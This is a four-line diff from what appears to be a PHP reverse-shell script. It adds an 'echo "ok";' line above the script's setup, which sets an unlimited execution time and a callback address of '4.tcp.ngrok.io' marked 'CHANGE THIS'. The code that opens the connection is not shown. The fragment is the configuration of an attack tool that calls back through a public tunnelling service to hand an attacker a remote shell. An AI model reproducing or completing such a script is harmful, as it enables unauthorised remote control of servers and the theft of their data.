@@ -1,3 +1,4 @@
+echo "ok";
 set_time_limit (0);
 $VERSION = "1.0";
 $ip = '4.tcp.ngrok.io';  // CHANGE THIS
